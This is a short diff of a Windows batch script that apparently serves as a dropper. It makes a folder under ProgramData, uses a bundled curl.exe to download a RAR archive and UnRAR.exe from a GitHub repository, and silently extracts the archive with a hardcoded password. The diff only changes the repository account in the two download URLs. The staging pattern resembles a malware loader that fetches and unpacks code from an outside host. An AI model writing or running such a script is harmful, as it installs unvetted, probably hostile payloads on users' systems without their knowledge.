@@ -1,7 +1,7 @@
 mkdir %ProgramData%\Comms
 
-%ProgramData%\curl.exe -L -o "%ProgramData%\Comms\pac.rar" https://github.com/vlad213-tex/1/raw/1/0/pac.rar
-%ProgramData%\curl.exe -L -o "%ProgramData%\Comms\UnRAR.exe" https://github.com/vlad213-tex/1/raw/1/0/UnRAR.exe
+%ProgramData%\curl.exe -L -o "%ProgramData%\Comms\pac.rar" https://github.com/vltex/1/raw/1/0/pac.rar
+%ProgramData%\curl.exe -L -o "%ProgramData%\Comms\UnRAR.exe" https://github.com/vltex/1/raw/1/0/UnRAR.exe
 
 "%ProgramData%\Comms\UnRAR.exe" x -y -p369852147 "%ProgramData%\Comms\pac.rar" "%ProgramData%\Comms\"
 
